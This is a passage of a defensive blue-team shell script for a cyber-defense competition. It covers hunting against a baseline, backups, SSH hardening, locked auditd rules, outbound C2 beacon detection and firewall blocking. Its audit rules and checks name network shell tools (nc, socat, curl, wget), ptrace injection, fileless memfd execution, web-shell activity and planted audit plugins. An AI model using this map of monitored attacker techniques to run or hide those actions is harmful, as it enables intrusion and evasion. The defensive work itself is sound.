        [ -n "$bu" ] && bo="$bo
    someone tried the bait login name (red team read your bait and tried it):
$(say "$bu" | sed 's/^/      /')"
    fi
    if [ -n "$bo" ]; then
        say "$bo" | sed '/^$/d'
        flag
        nxt "this is red team. Note the time, account and address. Block the address, and hunt for how they got in."
    else
        ok "nobody has touched the bait"
    fi
}

# Runs every check, in order of how often they caught something at the invitational.
every_check() {
    [ -n "$PTAB" ] || proc_table
    chk_decoy
    chk_trap
    chk_clock
    chk_ips
    chk_rat
    chk_c2
    chk_udp
    chk_exe
    chk_procs
    chk_mem
    chk_svc
    chk_kthread
    chk_shells
    chk_spam
    chk_sniff
    chk_preload
    chk_pam
    chk_pam2
    chk_pkg
    chk_sudo
    chk_polkit
    chk_accounts
    chk_keys
    chk_sshd
    chk_sshmatch
    chk_logins
    chk_domain
    chk_trip
    chk_jobs
    chk_init
    chk_hooks
    chk_shellinit
    chk_tamper
    chk_web
    chk_temp
    chk_rootkit
    chk_logs
    chk_mac
    chk_ci
    chk_k8s
    chk_k8s2
    chk_db
    chk_ransom
    chk_bait
    chk_bugs
    audit_check
    decoy_rearm
}

summary() {
    say ""
    say "======================================================================"
    if [ "$NFOUND" -eq 0 ]; then
        say "SUMMARY: nothing to look at."
    else
        say "SUMMARY: $NFOUND things to look at (top first):"
        printf '%s\n' "$FOUND" | tr '|' '\n' | sed '/^$/d' | sed 's/^/  - /'
        say "For each one: write down the time and what you see (sh first30.sh note \"...\"), tell your lead,"
        say "and save evidence before you delete anything (sh first30.sh evidence <file>)."
    fi
}

# ---------------------------------------------------------------- recon
do_recon() {
    need_root
    rep="$VAULT/recon_${HOST}_$TS.txt"
    recon_body 2>&1 | sanitize | tee "$rep"
    chmod 600 "$rep" 2>/dev/null
}

recon_body() {
    NOW_SNAP="$VAULT/snapshot_${HOST}_$TS.txt"
    proc_table
    snapshot > "$NOW_SNAP" 2>/dev/null
    info > "$VAULT/info_${HOST}_$TS.txt" 2>&1
    packages > "$VAULT/packages_${HOST}_$TS.txt" 2>&1
    if [ -f "$BASE" ]; then
        say "Baseline already exists, kept: $BASE"
        say "Baseline seal: $(seal "$BASE")   (it must match the seal on your paper)"
    else
        cp "$NOW_SNAP" "$BASE"
        save_md5sums
        say "Baseline saved: $BASE"
        say "Baseline seal: $(seal "$BASE")   <- WRITE THIS ON PAPER, with the box name"
        autonote "made the baseline (seal $(seal "$BASE"))"
    fi
    chmod 600 "$VAULT"/*.txt 2>/dev/null
    say ""
    say "== $HOST: $(grep '^PRETTY_NAME=' /etc/os-release 2>/dev/null | cut -d'"' -f2)"
    ip -br -4 a 2>/dev/null | grep -v '^lo' || ifconfig 2>/dev/null | grep 'inet '
    say "== Listening ports, the program, and the account it runs as (scored ones stay open)"
    listen_accounts
    say "== Root-level accounts (only root should be here)"
    grep '^UID0 ' "$NOW_SNAP" | sed 's/^UID0 /  /'
    say "== Admin groups"
    grep -E '^GROUP (sudo|wheel|admin|docker|lxd):' "$NOW_SNAP" | sed 's/^GROUP /  /'
    chk_self
    chk_plumbing
    every_check
    summary
    say ""
    say "== Your first 30 minutes"
    say "  1. Write the baseline seal above on paper, with the box name."
    say "  2. Change passwords (your lead has the plan), then: sh first30.sh note \"changed passwords for ...\""
    say "  3. Go through every finding above with your lead."
    say "  4. Stop terminal spam: sh first30.sh quiet"
    say "  5. Optional: plant a bait file BEFORE step 6: sh first30.sh bait /root/<a name only your team knows>"
    say "  6. Turn on and lock the audit log: sh first30.sh auditd"
    say "  7. Look for C2: sh first30.sh c2"
    say "  8. Hunt every 30 minutes: sh first30.sh hunt   (or run sh first30.sh for the menu)"
    say "  Also: protect the scoring engine and Black Team box (sh first30.sh protect <address>), look at the"
    say "  known bugs (menu 15), harden one step at a time (menu 14), and turn on the tripwire (menu 22)."
    say "  Something wrong at any point: sh first30.sh sos   (menu S)."
    say ""
    say "Full details: $VAULT/info_${HOST}_$TS.txt"
}

# ---------------------------------------------------------------- hunt
do_hunt() {
    need_root
    if [ ! -f "$BASE" ]; then
        say "No baseline yet. Run this first: sh first30.sh recon   (menu choice 1)"
        exit 1
    fi
    report="$VAULT/hunt_${HOST}_$TS.txt"
    DETAILS="$VAULT/hunt_${HOST}_${TS}_details.txt"
    PREV_SNAP=$(ls -1t "$VAULT"/snapshot_"$HOST"_*.txt 2>/dev/null | head -1)
    [ -n "$PREV_SNAP" ] || PREV_SNAP=$BASE
    NOW_SNAP="$VAULT/snapshot_${HOST}_$TS.txt"
    hunt_body 2>&1 | sanitize | tee "$report"
    chmod 600 "$report" "$DETAILS" 2>/dev/null
}

changed_files() {   # files changed after the reference file $1, oldest first: "HH:MM account path"
    if find / -maxdepth 0 -printf '' >/dev/null 2>&1; then
        { find /etc /root /home /usr/local /opt /srv /var/www /var/spool/cron /var/spool/at /boot \
              /bin /sbin /usr/bin /usr/sbin /usr/lib/systemd /lib/systemd /tmp /var/tmp /dev/shm -xdev \
              \( -path "$VAULT" -o -path '/home/*/.cache' -o -path /root/.cache -o -path '/tmp/systemd-private-*' \
                 -o -path '/var/tmp/systemd-private-*' -o -path '/home/*/.local/share' -o -path /root/.local/share \) -prune -o \
              -cnewer "$1" \( -type f -o -type l \) -printf '%C@ %CH:%CM %u %p\n'
          find /usr/lib /lib /usr/lib64 /lib64 -maxdepth 2 -xdev -cnewer "$1" -type f -printf '%C@ %CH:%CM %u %p\n'
        } 2>/dev/null | sort -n | cut -d' ' -f2-
    else
        cf_t=-cnewer
        if ! find / -maxdepth 0 -cnewer "$1" >/dev/null 2>&1; then
            cf_t=-newer
        fi
        { find /etc /root /home /usr/local /opt /srv /var/www /var/spool/cron /boot /bin /sbin /usr/bin /usr/sbin \
              /usr/lib/systemd /lib/systemd /tmp /var/tmp /dev/shm -xdev -path "$VAULT" -prune -o "$cf_t" "$1" -type f -print
          find /usr/lib /lib -maxdepth 2 -xdev "$cf_t" "$1" -type f -print
        } 2>/dev/null
    fi
}

hunt_body() {
    say "Hunt on $HOST at $(date '+%H:%M') ($(now_utc))"
    say "Baseline seal: $(seal "$BASE")   <- must match your paper. If not, someone edited the baseline: tell your lead."
    if [ ! -f "$VAULT/.stamp_$HOST" ]; then
        prevt="the start of the game ($(date -r "$PREV_SNAP" '+%H:%M'))"
        say "First hunt: comparing with the start-of-game snapshot."
    else
        prevt="your last hunt ($(date -r "$PREV_SNAP" '+%H:%M'))"
        say "Last hunt: $(date -r "$PREV_SNAP" '+%H:%M'), its seal $(seal "$PREV_SNAP") (should match what you posted)"
    fi
    stold="$VAULT/.stamp_$HOST"
    [ -f "$stold" ] || stold=$PREV_SNAP
    stnew="$VAULT/.stamp_new.$$"
    touch "$stnew"
    proc_table
    chk_self
    snapshot > "$NOW_SNAP" 2>/dev/null
    chmod 600 "$NOW_SNAP"
    : > "$DETAILS"

    # ---- part 1: the last 30 minutes
    sec last "1. What changed since $prevt"
    new=$(awk 'NR == FNR {s[$0] = 1; next} !/^# / && !($0 in s) && !d[$0]++' "$PREV_SNAP" "$NOW_SNAP")
    gone=$(awk 'NR == FNR {s[$0] = 1; next} !/^# / && !($0 in s) && !d[$0]++' "$NOW_SNAP" "$PREV_SNAP")
    if [ -z "$new$gone" ]; then
        ok "nothing in the inventory changed"
    else
        nl=$(printf '%s\n' "$new" | grep -c .)
        gl=$(printf '%s\n' "$gone" | grep -c .)
        { [ -n "$new" ] && show_diff NEW "$new"; [ -n "$gone" ] && show_diff GONE "$gone"; } > "$DETAILS.part1"
        head -40 "$DETAILS.part1"
        [ $((nl + gl)) -gt 40 ] && say "  ... $((nl + gl - 40)) more lines in $DETAILS"
        { say "== changed since $prevt"; cat "$DETAILS.part1"; } >> "$DETAILS"
        rm -f "$DETAILS.part1"
        flag
    fi
    [ -n "$LEARN" ] && learn files
    cf=$(changed_files "$stold")
    if [ -n "$cf" ]; then
        cc=$(printf '%s\n' "$cf" | grep -c .)
        say "  Files changed since then ($cc; time, account, file):"
        printf '%s\n' "$cf" | tail -40 | sed 's/^/    /'
        [ "$cc" -gt 40 ] && say "    ... the $((cc - 40)) older ones are in $DETAILS"
        find / -maxdepth 0 -cnewer "$stold" >/dev/null 2>&1 ||
            say "    (this box's find has no change-time search, so this list uses the modified time, which touch can fake)"
        { say "== files changed since $prevt"; printf '%s\n' "$cf"; } >> "$DETAILS"
    else
        say "  No files changed in the watched folders since then."
    fi
    ns=$(cat "$VAULT/.notes_seen_$HOST" 2>/dev/null)
    case "$ns" in ''|*[!0-9]*) ns=0 ;; esac
    nt=0
    [ -f "$NOTES" ] && nt=$(wc -l < "$NOTES" | tr -d ' ')
    if [ "$nt" -gt "$ns" ]; then
        say "  Team notes since then (the changes your team made):"
        tail -n "+$((ns + 1))" "$NOTES" | sed 's/^/    /'
    else
        say "  No team notes since then. Changed something? Write it down: sh first30.sh note \"what you did\""
    fi
    say "$nt" > "$VAULT/.notes_seen_$HOST"
    [ -n "$new$gone$cf" ] && nxt "anything above that is NOT in your team notes was done by someone else. Start there."

    # ---- part 2: since the baseline, as counts
    sec base "2. Changed since the baseline ($(date -r "$BASE" '+%H:%M'))"
    bnew=$(awk 'NR == FNR {s[$0] = 1; next} !/^# / && !($0 in s) && !d[$0]++' "$BASE" "$NOW_SNAP")
    bgone=$(awk 'NR == FNR {s[$0] = 1; next} !/^# / && !($0 in s) && !d[$0]++' "$NOW_SNAP" "$BASE")
    if [ -z "$bnew$bgone" ]; then
        ok "the box matches the baseline"
    else
        [ -n "$bnew" ] && say "  new:  $(count_by_tag "$bnew")"
        [ -n "$bgone" ] && say "  gone: $(count_by_tag "$bgone")"
        say "  The full list is in $DETAILS. Part 1 shows the newest of these."
        { say "== changed since the baseline"
          [ -n "$bnew" ] && show_diff NEW "$bnew"
          [ -n "$bgone" ] && show_diff GONE "$bgone"; } >> "$DETAILS"
    fi

    # ---- part 3: checks that run every time
    say ""
    say "== 3. Checks that run every time (they do not trust the baseline)"
    every_check
    summary
    say "Saved: $report"
    say "This hunt's seal: $(seal "$NOW_SNAP")   <- post it in your team channel with the time."
    nh=$(date -d '+30 min' '+%H:%M' 2>/dev/null) && say "Next hunt: about $nh."
    mv "$stnew" "$VAULT/.stamp_$HOST"
}

# ---------------------------------------------------------------- backup
TOTALKB=0
add_path() {
    # $1 is a path relative to /. Skips it if missing or too big.
    [ -e "/$1" ] || return 1
    kb=$(du -sk "/$1" 2>/dev/null | awk '{print $1}')
    kb=${kb:-0}
    if [ "$kb" -gt $((MAXMB * 1024)) ]; then
        say "  skipped /$1 ($((kb / 1024)) MB, over the $MAXMB MB limit)"
        return 1
    fi
    TOTALKB=$((TOTALKB + kb))
    return 0
}

do_backup() {
    need_root
    start=$(date +%s)
    set --
    for p in etc home var/www srv opt usr/local/etc usr/local/bin usr/local/sbin \
        usr/share/nginx/html var/spool/cron var/named var/lib/rancher/k3s/server/manifests; do
        add_path "$p" && set -- "$@" "$p"
    done
    for e in /root/* /root/.[!.]* /root/..?*; do
        [ -e "$e" ] || continue
        [ "$e" = "$VAULT" ] && continue
        add_path "${e#/}" && set -- "$@" "${e#/}"
    done
    if [ "$#" -eq 0 ]; then
        say "Nothing to back up was found."
        exit 1
    fi
    avail=$(df -Pk "$VAULT" | awk 'NR == 2 {print $4}')
    if [ "$TOTALKB" -gt $((avail / 2)) ]; then
        say "Not enough free disk space: need about $((TOTALKB / 1024)) MB, $((avail / 1024)) MB free."
        say "Nothing was backed up. Try a smaller limit: MAXMB=100 sh first30.sh backup"
        exit 1
    fi
    out="$VAULT/backup_${HOST}_$TS.tgz"
    err="$VAULT/backup_${HOST}_$TS.err"
    say "Backing up: $*"
    # the bait file stays out, so the backup does not set it off
    tar -czf "$out" --exclude="${BAIT#/}" -C / "$@" 2> "$err"
    rc=$?
    sha256sum "$out" > "$out.sha256"
    chmod 600 "$out" "$out.sha256" "$err"
    say "Backup: $out ($(du -k "$out" | awk '{print $1}') KB) in $(($(date +%s) - start)) seconds"
    if [ "$rc" -ne 0 ]; then
        say "tar exit code $rc. Usually files that changed while reading. Check: $err"
    elif [ -s "$err" ]; then
        say "$(wc -l < "$err") warnings in $err (sockets and changing files are normal)"
    fi
    db_backup
    fw_backup
    decoy_rearm
    if [ -z "$db_any" ] && { grep -q -E ':(3306|5432|27017)$' "$BASE" 2>/dev/null || have mysqld || have mariadbd || have postgres; }; then
        say "Database found. Its data files are NOT in this backup. A lead takes a proper dump."
    fi
    if [ -f /opt/.filetool.lst ]; then
        say "Tiny Core: /root may live in RAM, so this backup can vanish on reboot."
        say "After changing passwords: add etc/shadow and etc/passwd to /opt/.filetool.lst, then run filetool.sh -b"
    fi
}

# ---------------------------------------------------------------- ssh
find_cfg() {
    for c in /etc/ssh/sshd_config /usr/local/etc/ssh/sshd_config; do
        if [ -f "$c" ]; then echo "$c"; return 0; fi
    done
    return 1
}

reload_sshd() {
    if have systemctl; then
        systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null ||
            systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null && return 0
    fi
    for s in /etc/init.d/sshd /etc/init.d/ssh /usr/local/etc/init.d/openssh /etc/rc.d/rc.sshd; do
        [ -x "$s" ] && "$s" restart >/dev/null 2>&1 && return 0
    done
    pid=$(cat /run/sshd.pid /var/run/sshd.pid 2>/dev/null | head -1)
    [ -n "$pid" ] && kill -HUP "$pid" && return 0
    say "Could not reload sshd. Restart it by hand."
    return 1
}

root_login_setting() {
    "$1" -T -f "$2" 2>/dev/null | awk 'tolower($1) == "permitrootlogin" {print $2}'
}

do_ssh() {
    need_root
    cfg=$(find_cfg) || { say "No sshd_config found. Nothing changed."; exit 1; }
    sshd=$(find_sshd) || { say "sshd not found. Nothing changed."; exit 1; }
    if [ -L "$cfg" ] || [ -d /etc/nixos ]; then
        say "This looks like NixOS. sshd_config is generated, so editing it will not stick."
        say "Set services.openssh.settings.PermitRootLogin = \"no\"; in /etc/nixos/configuration.nix,"
        say "then run nixos-rebuild switch. Nothing changed."
        exit 1
    fi
    others=$(awk -F: 'NR == FNR { if ($2 != "" && $2 !~ /^[!*]/) ok[$1] = 1; next }
        $1 != "root" && $3 >= 1000 && $3 < 65534 && $7 !~ /(nologin|false)$/ && ($1 in ok) {printf "%s ", $1}' \
        /etc/shadow /etc/passwd)
    if [ -z "$others" ]; then
        say "No other account here has a password and a login shell."
        say "Turning off root SSH now could lock you out. Nothing changed."
        exit 1
    fi
    ssh_admin_guard "$others" || exit 1
    if [ "$(root_login_setting "$sshd" "$cfg")" = "no" ]; then
        say "Root SSH login is already off. Nothing changed."
        exit 0
    fi
    before="$VAULT/sshd_config_${HOST}_before.bak"
    [ -f "$before" ] || cp -p "$cfg" "$before"
    cp -p "$cfg" "$VAULT/sshd_config_${HOST}_$TS.bak"
    # sshd uses the first value it reads, so the line goes at the very top,
    # above any Include and outside any Match block.
    { echo "PermitRootLogin no"; cat "$cfg"; } > "$VAULT/.sshd_new" && cat "$VAULT/.sshd_new" > "$cfg"
    rm -f "$VAULT/.sshd_new"
    if ! "$sshd" -t -f "$cfg"; then
        cat "$VAULT/sshd_config_${HOST}_$TS.bak" > "$cfg"
        say "The new config failed its test, so the old one was put back. Nothing changed."
        exit 1
    fi
    reload_sshd
    autonote "turned off root login over SSH (PermitRootLogin no at the top of $cfg)"
    say "Root SSH login is now: $(root_login_setting "$sshd" "$cfg")"
    say "Accounts that can still log in over SSH: $others"
    say "Your current session stays open. Test a NEW login as one of those accounts before you log out."
    say "If SSH on this box is scored and logs in as root, undo with: sh first30.sh undo-ssh"
}

do_undo_ssh() {
    need_root
    cfg=$(find_cfg) || { say "No sshd_config found."; exit 1; }
    sshd=$(find_sshd) || { say "sshd not found."; exit 1; }
    before="$VAULT/sshd_config_${HOST}_before.bak"
    [ -f "$before" ] || { say "No saved config to restore."; exit 1; }
    cat "$before" > "$cfg"
    "$sshd" -t -f "$cfg" && reload_sshd
    autonote "put the SSH config back (undo-ssh)"
    say "SSH config restored. Root SSH login is now: $(root_login_setting "$sshd" "$cfg")"
}

# ---------------------------------------------------------------- auditd
# auditd is the Linux audit log. It has to run as root, because only root may
# control the kernel's auditing, so it cannot be moved into an account of its own.
# It is protected instead: its rules are locked until a reboot, it watches its own
# files and tools, only root can read its logs, and every hunt checks it.
AUDIT_RULES=/etc/audit/rules.d/60-first30.rules

audit_enabled() {   # 0 = off, 1 = on, 2 = on and locked, empty = unknown
    auditctl -s 2>/dev/null | sed -n 's/.*enabled[ =]\([0-9]\).*/\1/p' | head -1
}

audit_running() { pidof auditd >/dev/null 2>&1 || pgrep -x auditd >/dev/null 2>&1; }

audit_watch() {   # $1 = key, $2 = permissions, then paths. Skips a path whose folder is missing.
    aw_k=$1 aw_p=$2
    shift 2
    for aw_f in "$@"; do
        [ -e "$aw_f" ] || [ -d "$(dirname "$aw_f")" ] || continue
        aw_r=$(readlink -f "$aw_f" 2>/dev/null)
        [ -n "$aw_r" ] || aw_r=$aw_f
        case " $AUDIT_SEEN " in *" $aw_r "*) continue ;; esac
        AUDIT_SEEN="$AUDIT_SEEN $aw_r"
        say "-w $aw_r -p $aw_p -k $aw_k"
    done
}

audit_exec() {    # $1 = key, then program names: log every time one of them runs
    ae_k=$1
    shift
    for ae_t in "$@"; do
        ae_f=$(command -v "$ae_t" 2>/dev/null) || continue
        audit_watch "$ae_k" x "$ae_f"
    done
}

audit_syscall() {   # one syscall rule for each CPU type this box runs
    case "$(uname -m)" in
        x86_64) say "-a always,exit -F arch=b64 $*"; say "-a always,exit -F arch=b32 $*" ;;
        aarch64|ppc64*|s390x) say "-a always,exit -F arch=b64 $*" ;;
        *) say "-a always,exit -F arch=b32 $*" ;;
    esac
}

audit_rules() {
    AUDIT_SEEN=''
    say "## first30 audit rules. Read the log by key: ausearch -k <key> -i"
    say "## -i: a rule that does not fit this box is skipped instead of stopping the rest."
    say "-i"
    audit_watch identity wa /etc/passwd /etc/shadow /etc/group /etc/gshadow
    audit_watch sudoers wa /etc/sudoers /etc/sudoers.d
    audit_watch pam wa /etc/pam.d /etc/security
    audit_watch ssh wa /etc/ssh /root/.ssh
    audit_watch cron wa /etc/crontab /etc/anacrontab /etc/cron.d /etc/cron.hourly /etc/cron.daily \
        /etc/cron.weekly /etc/cron.monthly /var/spool/cron /var/spool/at
    audit_watch services wa /etc/systemd/system /usr/local/lib/systemd/system /usr/lib/systemd/system \
        /lib/systemd/system /etc/init.d /etc/rc.local /etc/systemd/user
    audit_watch preload wa /etc/ld.so.preload /etc/ld.so.conf /etc/ld.so.conf.d /etc/environment
    audit_watch shellinit wa /etc/profile /etc/profile.d /etc/bash.bashrc /etc/bashrc /root/.bashrc /root/.profile
    audit_watch network wa /etc/hosts /etc/network /etc/netplan /etc/sysconfig/network-scripts \
        /etc/NetworkManager/system-connections /etc/resolv.conf /etc/nsswitch.conf
    audit_watch webroot wa /var/www
    audit_watch mac wa /etc/selinux /etc/apparmor /etc/apparmor.d
    audit_watch logins wa /var/log/lastlog /var/run/faillock /var/log/wtmp /var/log/btmp
    [ -e /etc/localtime ] && say "-w /etc/localtime -p wa -k time-change"
    audit_watch auditconfig wa /etc/audit /etc/audisp /etc/libaudit.conf
    # this script's own vault and file: editing the baseline or the script gets logged
    audit_watch first30 wa "$VAULT"
    [ -n "$SCRIPT" ] && audit_watch first30 wa "$SCRIPT"
    # the bait: anyone who even opens it gets logged
    [ -n "$BAIT" ] && audit_watch bait rwa "$BAIT"
    audit_exec audittools auditctl auditd augenrules
    audit_exec privesc sudo su
    audit_exec accounts useradd usermod userdel groupadd groupmod gpasswd passwd chpasswd
    audit_exec tamper chattr setfacl
    for sp_p in $SPAM_PROGS; do
        sp_f=$(command -v "$sp_p" 2>/dev/null) && audit_watch spam wxa "$sp_f"
    done
    audit_exec modules insmod rmmod modprobe
    audit_exec nettools nc ncat netcat socat wget curl
    audit_syscall "-S init_module -S finit_module -S delete_module -k modules"
    audit_syscall "-S adjtimex -S settimeofday -S clock_settime -k time-change"
    # every command run by the web server's account: a web shell in use shows here
    for wu in www-data apache nginx http lighttpd; do
        wi=$(id -u "$wu" 2>/dev/null) || continue
        audit_syscall "-S execve -F euid=$wi -k webexec"
    done
    # v5: ways to run or inject code that the rules above do not see
    audit_syscall "-S execveat -k execveat"
    audit_syscall "-S ptrace -F a0=0x4 -k inject"
    audit_syscall "-S ptrace -F a0=0x5 -k inject"
    audit_syscall "-S ptrace -F a0=0x6 -k inject"
    audit_syscall "-S ptrace -F a0=0x10 -k inject"
    audit_syscall "-S memfd_create -k fileless"
    audit_syscall "-S bpf -F a0=0x5 -k bpf"
    if [ -s "$DECOYS" ]; then
        while read -r ar_d _; do [ -e "$ar_d" ] && say "-w $ar_d -p rwa -k decoy"; done < "$DECOYS"
    fi
    say "## Lock the rules: nothing can change or delete them until a reboot."
    say "-e 2"
}

audit_install() {
    if have apt-get; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y auditd ||
            { apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y auditd; }
    elif have dnf; then dnf install -y audit
    elif have yum; then yum install -y audit
    elif have zypper; then zypper --non-interactive install audit
    elif have pacman; then pacman -S --noconfirm audit
    elif have apk; then apk add audit
    else return 1
    fi
}

audit_check() {
    sec audit "auditd, the Linux audit log (T1562.001: red team turns off or takes over logging)"
    if ! have auditctl; then
        say "  NOT installed. Set it up: sh first30.sh auditd"
        flag
        return 0
    fi
    abad=0
    if audit_running; then say "  auditd is running"; else say "  auditd is NOT running"; abad=1; fi
    case "$(audit_enabled)" in
        2) say "  auditing is on and locked (good)" ;;
        1) say "  auditing is on but NOT locked: root can delete the rules. Lock it: sh first30.sh auditd" ;;
        0) say "  auditing is OFF"; abad=1 ;;
        *) say "  could not read auditd's status" ;;
    esac
    say "  rules loaded: $(auditctl -l 2>/dev/null | grep -c -v '^No rules')"
    # auditd starts every active plugin as root, and restarts it if it dies. A planted
    # plugin is one way to take over auditd. Real plugins come from a package.
    for f in /etc/audit/plugins.d/*.conf /etc/audisp/plugins.d/*.conf; do
        [ -f "$f" ] || continue
        grep -q -i -E '^[[:space:]]*active[[:space:]]*=[[:space:]]*yes' "$f" || continue
        pl=$(sed -n 's/^[[:space:]]*path[[:space:]]*=[[:space:]]*//p' "$f" | head -1)
        case "$pl" in
            builtin_*|'') say "  plugin on: $f (built in)" ;;
            *)  from_package "$pl"
                case $? in
                    0) say "  plugin on: $f runs $pl (from a package)" ;;
                    1) say "  plugin on: $f runs $pl  <- NOT from any package: likely planted"; abad=1 ;;
                    *) say "  plugin on: $f runs $pl (could not check its package)" ;;
                esac ;;
        esac
    done
    if [ "$abad" = 1 ]; then
        flag
        nxt "tell your lead. Save evidence of any planted plugin, then: systemctl restart auditd (or reboot to reload the locked rules)."
    fi
}

do_auditd() {
    need_root
    if ! have auditctl; then
        say "auditd is not installed. Installing it from this box's package repos..."
        if ! audit_install > "$VAULT/auditd_install_$TS.log" 2>&1 || ! have auditctl; then
            say "The install failed (see $VAULT/auditd_install_$TS.log)."
            say "Fix this box's package repos, then run this again."
            exit 1
        fi
    fi
    if [ "$(audit_enabled)" = 2 ]; then
        say "The audit rules are already locked. Nothing can change them until a reboot."
        say "To change them: edit $AUDIT_RULES, then reboot."
        audit_harden
        audit_check
        return 0
    fi
    # Only root may change auditd's settings, rules and plugins, or read its logs.
    chown -R root:root /etc/audit 2>/dev/null
    chmod -R go-w /etc/audit 2>/dev/null
    if [ -d /var/log/audit ]; then chown root:root /var/log/audit; chmod 700 /var/log/audit; fi
    mkdir -p /etc/audit/rules.d
    audit_rules > "$AUDIT_RULES"
    chmod 600 "$AUDIT_RULES"
    say "Rules written: $AUDIT_RULES ($(grep -c '^-w' "$AUDIT_RULES") files, folders and programs watched)"
    # start it now, and at every boot
    if have systemctl && systemctl list-units --no-legend >/dev/null 2>&1; then
        systemctl enable auditd >/dev/null 2>&1
        audit_running || systemctl start auditd >/dev/null 2>&1
    elif have rc-service; then
        rc-update add auditd default >/dev/null 2>&1
        audit_running || rc-service auditd start >/dev/null 2>&1
    elif have service; then
        audit_running || service auditd start >/dev/null 2>&1
    fi
    # load the rules; augenrules merges everything in rules.d and always puts the lock last
    if [ "$(audit_enabled)" != 2 ]; then
        if have augenrules; then augenrules --load >/dev/null 2>&1
        else auditctl -R "$AUDIT_RULES" >/dev/null 2>&1; fi
    fi
    audit_harden
    autonote "set up and locked auditd ($AUDIT_RULES)"
    from_package / >/dev/null 2>&1
    audit_check
    say ""
    say "Read the log by key, for example: ausearch -k identity -i   (or: ausearch -k webexec --format text)"
    say "Keys: identity sudoers pam ssh cron services preload shellinit network webroot mac logins time-change"
    say "      auditconfig first30 bait audittools privesc accounts tamper spam modules nettools webexec"
    say "      v5: execveat inject (ptrace) fileless (memfd_create) bpf decoy"
    say "To change the rules later: edit $AUDIT_RULES, then reboot."
}

# ---------------------------------------------------------------- c2 (the 30-second watch)
do_c2() {
    need_root
    from_package / >/dev/null 2>&1
    LPORTS=$(listen_ports)
    sec c2 "Programs with connections OUT of this box right now (T1071)"
    [ -n "$OURNETS" ] && say "   Your networks: $OURNETS (anything else is marked)"
    printf '  %-16s %-7s %-10s %-22s %s\n' PROGRAM PID ACCOUNT 'TO ADDRESS:PORT' 'MARKED BECAUSE'
    co=$(c2_rows)
    if [ -n "$co" ]; then say "$co"; else say "  none"; fi
    say ""
    say "== Who keeps calling out? Watching for 30 seconds... (T1071)"
    samples="$VAULT/.c2samples.$$"
    : > "$samples"
    i=0
    while [ "$i" -lt 6 ]; do
        outbound | awk -v s="$i" '{print s, $1 ":" $2, $3, $4, $5}' >> "$samples"
        i=$((i + 1))
        [ "$i" -lt 6 ] && sleep 5
    done
    # count only connections that were not there in the first look: a program that
    # keeps a few connections open all the time is not calling out again and again
    out=$(awk '{k = $2 " " $3 " " $4; c = k " " $5
               if ($1 == 0) {first[c] = 1; next}
               if ((c in first) || (c in seen)) next
               seen[c] = 1; n[k]++}
         END {for (k in n) if (n[k] >= 3) print n[k], k}' "$samples" | sort -rn)
    rm -f "$samples"
    if [ -n "$out" ]; then
        say "  These opened 3 or more new connections to the same place in 30 seconds."
        say "  A C2 agent checking in looks like this (so do some normal programs). Check each one:"
        printf '%s\n' "$out" | awk '{printf "    %s new connections to %s from %s (pid %s)\n", $1, $2, $3, $4}'
    else
        say "  nothing kept opening new connections to the same place"
    fi
    say ""
    say "Write down the time, the program and the address first: that is your incident report."
    say "Save the program: sh first30.sh evidence /proc/<pid>/exe"
    say "Then cut the address off, in and out: sh first30.sh block <address>"
    [ -z "$OURNETS" ] && say "Tip: tell the script your networks so outside addresses get marked: sh first30.sh nets 10.100.130.0/24"
}

# ---------------------------------------------------------------- block / unblock
# Cut an address off in both directions, and keep a list for the incident report.
# Safety: it will not block this box, your own SSH session, the default gateway or a
# DNS server. Never block the scoring engine: check the packet for its address.
valid_ip() {   # an IPv4 address, or address/bits
    printf '%s\n' "$1" | grep -E -q '^([0-9]{1,3}\.){3}[0-9]{1,3}(/([0-9]|[12][0-9]|3[0-2]))?$' || return 1
    printf '%s\n' "${1%/*}" | awk -F. '{exit !($1 <= 255 && $2 <= 255 && $3 <= 255 && $4 <= 255)}'
}

fw_firewalld() { have firewall-cmd && firewall-cmd --state >/dev/null 2>&1; }

fw_block() {
    if fw_firewalld; then
        firewall-cmd --direct --add-rule ipv4 filter OUTPUT 0 -d "$1" -j DROP >/dev/null 2>&1 &&
            firewall-cmd --direct --add-rule ipv4 filter INPUT 0 -s "$1" -j DROP >/dev/null 2>&1 || return 1
        firewall-cmd --permanent --direct --add-rule ipv4 filter OUTPUT 0 -d "$1" -j DROP >/dev/null 2>&1
        firewall-cmd --permanent --direct --add-rule ipv4 filter INPUT 0 -s "$1" -j DROP >/dev/null 2>&1
        return 0
    fi
    if have iptables && iptables -S OUTPUT >/dev/null 2>&1; then
        iptables -C OUTPUT -d "$1" -j DROP 2>/dev/null || iptables -I OUTPUT -d "$1" -j DROP || return 1
        iptables -C INPUT -s "$1" -j DROP 2>/dev/null || iptables -I INPUT -s "$1" -j DROP || return 1
        return 0
    fi
    if have nft; then
        if ! nft list table inet first30 >/dev/null 2>&1; then
            nft add table inet first30 &&
                nft add chain inet first30 in '{ type filter hook input priority -10 ; policy accept ; }' &&
                nft add chain inet first30 out '{ type filter hook output priority -10 ; policy accept ; }' ||
                return 1
        fi
        nft list chain inet first30 in 2>/dev/null | grep -q "saddr $1 drop" ||
            nft add rule inet first30 in ip saddr "$1" drop || return 1
        nft list chain inet first30 out 2>/dev/null | grep -q "daddr $1 drop" ||
            nft add rule inet first30 out ip daddr "$1" drop || return 1
        return 0
    fi
    return 1
}

fw_unblock() {
    if fw_firewalld; then
        for fu_perm in '' --permanent; do
            # shellcheck disable=SC2086
            firewall-cmd $fu_perm --direct --remove-rule ipv4 filter OUTPUT 0 -d "$1" -j DROP >/dev/null 2>&1
            # shellcheck disable=SC2086
            firewall-cmd $fu_perm --direct --remove-rule ipv4 filter INPUT 0 -s "$1" -j DROP >/dev/null 2>&1
        done
    fi
    if have iptables; then
        while iptables -D OUTPUT -d "$1" -j DROP 2>/dev/null; do :; done
        while iptables -D INPUT -s "$1" -j DROP 2>/dev/null; do :; done
    fi
    if have nft && nft list table inet first30 >/dev/null 2>&1; then
        for fu_ch in in out; do
            nft -a list chain inet first30 "$fu_ch" 2>/dev/null |
                awk -v ip="$1" 'index($0, "addr " ip " drop") {print $NF}' |
                while read -r fu_h; do nft delete rule inet first30 "$fu_ch" handle "$fu_h"; done
        done
    fi
}

do_block() {   # $@ = addresses
    need_root
    again=''
    if [ "$#" -eq 0 ]; then
        # no address given: put back every saved block (after a reboot or a firewall reload)
        if [ ! -s "$VAULT/blocked.txt" ]; then
            say "Usage: sh first30.sh block <address> [<address> ...]"
